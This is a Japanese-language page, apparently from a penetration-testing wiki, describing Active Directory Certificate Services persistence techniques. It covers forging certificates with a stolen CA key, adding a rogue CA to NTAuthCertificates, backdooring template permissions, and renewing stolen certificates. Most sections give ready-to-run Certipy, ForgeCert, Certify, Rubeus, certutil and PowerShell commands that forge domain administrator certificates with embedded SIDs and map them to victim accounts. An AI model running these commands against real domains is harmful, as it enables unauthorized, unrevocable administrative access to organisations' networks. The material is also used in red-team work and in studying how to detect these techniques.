# AD CS ドメイン永続化

{{#include ../../../banners/hacktricks-training.md}}

**これは、[https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) で紹介されているドメイン永続化テクニックの概要です**。詳細については、こちらを確認してください。<sup>[[5]](#references)</sup>

## 盗んだ CA 証明書による証明書の偽造 (Golden Certificate) - DPERSIST1

証明書が CA 証明書であることは、どのように判断できますか？

以下の条件をいくつか満たす場合、その証明書は CA 証明書であると判断できます。<sup>[[5]](#references)</sup>

- 証明書は CA サーバー上に保存され、その秘密鍵はマシンの DPAPI、またはオペレーティングシステムがサポートする場合は TPM/HSM などのハードウェアによって保護されています。
- 証明書の Issuer フィールドと Subject フィールドが、どちらも CA の識別名と一致します。
- CA 証明書にのみ「CA Version」拡張が含まれています。
- 証明書に Extended Key Usage (EKU) フィールドがありません。

この証明書の秘密鍵を抽出するには、CA サーバー上の `certsrv.msc` ツールを使う方法が、組み込み GUI でサポートされている手段です。ただし、この証明書はシステム内に保存されている他の証明書と異なるものではありません。そのため、[THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) などの方法を適用して抽出できます。

Certipy を使用し、以下のコマンドで証明書と秘密鍵を取得することもできます。<sup>[[2]](#references)</sup>

```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```

CA証明書とその秘密鍵を`.pfx`形式で取得すると、[ForgeCert](https://github.com/GhostPack/ForgeCert)などのツールを使って有効な証明書を生成できます。

```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```

> [!WARNING]
> 証明書の偽造対象となるユーザーは、処理を成功させるために、Active Directory で有効かつ認証可能である必要があります。krbtgt などの特別なアカウントの証明書を偽造しても効果はありません。

この偽造証明書は、指定された終了日まで、かつルート CA 証明書が有効である限り **有効** です（通常は 5〜**10 年以上**）。**マシン** に対しても有効なため、**S4U2Self** と組み合わせることで、攻撃者は CA 証明書が有効な間、**任意のドメインマシン上で永続性を維持できます**。\
さらに、この方法で**生成された証明書**は、CA が認識していないため、**失効できません**。

### Strong Certificate Mapping Enforcement 下での運用（2025年以降）

2025年2月11日以降（KB5014754 の展開後）、ドメインコントローラーでは証明書マッピングがデフォルトで **Full Enforcement** になります。実際には、偽造証明書は次のいずれかを満たす必要があります。

- 対象アカウントとの強いバインディング（SID セキュリティ拡張など）を含む、または
- 対象オブジェクトの `altSecurityIdentities` 属性に強い明示的マッピングを設定する。<sup>[[1]](#references)</sup>

永続性を確保する確実な方法は、盗んだ Enterprise CA に連なる偽造証明書を発行し、その後、被害者のプリンシパルに強い明示的マッピングを追加することです。

```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```

Notes
- SID security extensionを含むforged certificatesを作成できれば、Full Enforcement下でも暗黙的にマッピングされます。それができない場合は、明示的なstrong mappingsを優先してください。明示的なmappingsの詳細については、[account-persistence](account-persistence.md)を参照してください。
- ここではrevocationは防御側の助けになりません。forged certificatesはCA databaseに存在しないため、失効させることができません。

#### Full-Enforcement compatible forging (SID-aware)

更新されたtoolingではSIDを直接埋め込めるため、DCがweak mappingsを拒否する場合でもgolden certificatesを利用できます:<sup>[[3]](#references)</sup>

```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
  --upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
  --outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
  -sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```

SIDを埋め込むことで、監視されている可能性のある`altSecurityIdentities`に触れることなく、強力なマッピングチェックを満たせます。

## Trusting Rogue CA Certificates - DPERSIST2

`NTAuthCertificates`オブジェクトには、その`cacertificate`属性にActive Directory（AD）が使用する1つ以上の**CA証明書**が格納されるよう定義されています。**ドメインコントローラー**は検証時に、認証に使用する**証明書**のIssuerフィールドで指定された**CA**に一致するエントリが`NTAuthCertificates`オブジェクトにあるか確認します。一致するエントリが見つかると、認証が続行されます。<sup>[[5]](#references)</sup>

攻撃者は、このADオブジェクトを制御できる場合、自己署名CA証明書を`NTAuthCertificates`オブジェクトに追加できます。通常、このオブジェクトを変更する権限が付与されるのは、**Enterprise Admin**グループのメンバーと、**フォレストルートドメイン**の**Domain Admins**または**Administrators**です。`certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`コマンドを使うか、[**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool)を使用して、`NTAuthCertificates`オブジェクトを編集できます。

この手法で役立つその他のコマンド：

```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```

この機能は、前述のForgeCertを使って証明書を動的に生成する手法と組み合わせる場合に、特に有用です。

> 2025年以降のマッピングに関する考慮事項: NTAuthに不正なCAを登録すると、発行CAへの信頼が確立されます。DCが**Full Enforcement**の場合、ログオンにリーフ証明書を使うには、証明書にSIDセキュリティ拡張が含まれているか、対象オブジェクトに強力な明示的マッピング（たとえば、`altSecurityIdentities`のIssuer+Serial）が設定されている必要があります。詳しくは{{#ref}}account-persistence.md{{#endref}}を参照してください。

## 悪意ある設定ミス - DPERSIST3

AD CSコンポーネントの**セキュリティ記述子を変更**して**永続化**する機会は数多くあります。「[ドメインの権限昇格](domain-escalation.md)」セクションで説明した変更は、昇格したアクセス権を持つ攻撃者によって悪用される可能性があります。これには、次のような機密性の高いコンポーネントへの「制御権」（例: WriteOwner/WriteDACLなど）の追加が含まれます:<sup>[[5]](#references)</sup>

- **CAサーバーのADコンピューター**オブジェクト
- **CAサーバーのRPC/DCOMサーバー**
- **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`**内のすべての**子孫ADオブジェクトまたはコンテナー**（例: 証明書テンプレートコンテナー、認証局コンテナー、NTAuthCertificatesオブジェクトなど）
- 組織からCAまたはテンプレートの制御権を明示的に委任された**ADグループ**。組み込みのCert Publishersグループには、AD内のユーザーオブジェクトに証明書を発行する権限がありますが、グループへの所属だけではCAやテンプレートの制御権、または登録権限は付与されません。CAとテンプレートの権限は個別に確認してください。詳しくは[Cert Publishersに関するMicrosoftの説明](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers)および[証明書テンプレートの権限](https://learn.microsoft.com/en-us/intune/configmgr/protect/plan-design/planning-for-certificate-template-permissions)を参照してください。

悪意ある設定の例として、ドメイン内で**昇格した権限**を持つ攻撃者が、既定の**`User`**証明書テンプレートに**`WriteOwner`**権限を追加し、自分自身をその権限のプリンシパルにする方法があります。これを悪用するには、まず攻撃者が**`User`**テンプレートの所有者を自分に変更します。次に、テンプレートの**`mspki-certificate-name-flag`**を**1**に設定して**`ENROLLEE_SUPPLIES_SUBJECT`**を有効にし、ユーザーが要求時にSubject Alternative Nameを指定できるようにします。その後、攻撃者は**テンプレート**を使って**登録**し、別名として**ドメイン管理者**の名前を指定して、取得した証明書をDAとしての認証に利用できます。

攻撃者がドメインへの長期的な永続化のために設定できる実用的な項目（詳細と検出方法については{{#ref}}domain-escalation.md{{#endref}}を参照）:

- 要求者がSANを指定できるようにするCAポリシーフラグ（例: `EDITF_ATTRIBUTESUBJECTALTNAME2`を有効化）。これにより、ESC1に類似した経路が悪用可能な状態に保たれます。
- 認証に使える証明書の発行を許可するテンプレートDACLまたは設定（例: Client Authentication EKUの追加、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`の有効化）。
- `NTAuthCertificates`オブジェクトまたはCAコンテナーを制御し、防御側がクリーンアップを試みても不正な発行者を再登録できるようにする。

> [!TIP]
> KB5014754適用後の強化された環境では、これらの設定ミスと明示的な強力なマッピング（`altSecurityIdentities`）を組み合わせることで、DCが強力なマッピングを強制している場合でも、発行または偽造した証明書を引き続き使用できます。

### 永続化のための証明書更新の悪用（ESC14）

認証に使える証明書（またはEnrollment Agent証明書）を侵害すると、発行テンプレートが公開されたままで、CAが発行者チェーンを引き続き信頼している限り、**無期限に更新**できます。更新すると元のIDバインディングが維持されたまま有効期間が延長されるため、テンプレートを修正するかCAを再公開しない限り、排除は困難です。<sup>[[4]](#references)</sup>

```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```

ドメインコントローラーが**Full Enforcement**の場合は、`-sid <victim SID>`を追加するか、SID security extensionを含むテンプレートを使用してください。そうすれば、`altSecurityIdentities`に手を加えずに、更新されたleaf certificateが引き続き強くマッピングされます。CA admin rightsを持つ攻撃者は、自分に証明書を発行する前に`policy\RenewalValidityPeriodUnits`を変更して、更新後の有効期間を延長することもできます。<sup>[[2]](#references)[[4]](#references)</sup>


## References

- [1] [Microsoft KB5014754 – Windowsドメインコントローラーにおける証明書ベース認証の変更（適用スケジュールと強力なマッピング）](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [Certipy – コマンドリファレンスとforge/authの使用方法](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [3] [SpecterOps – Certify 2.0（SID supportを備えた統合型forge）](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [ESC14 renewal abuseの概要](https://www.adcs-security.com/attacks/esc14)
- [5] [SpecterOps – Certified Pre-Owned: Active Directory Certificate Servicesの悪用](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
{{#include ../../../banners/hacktricks-training.md}}
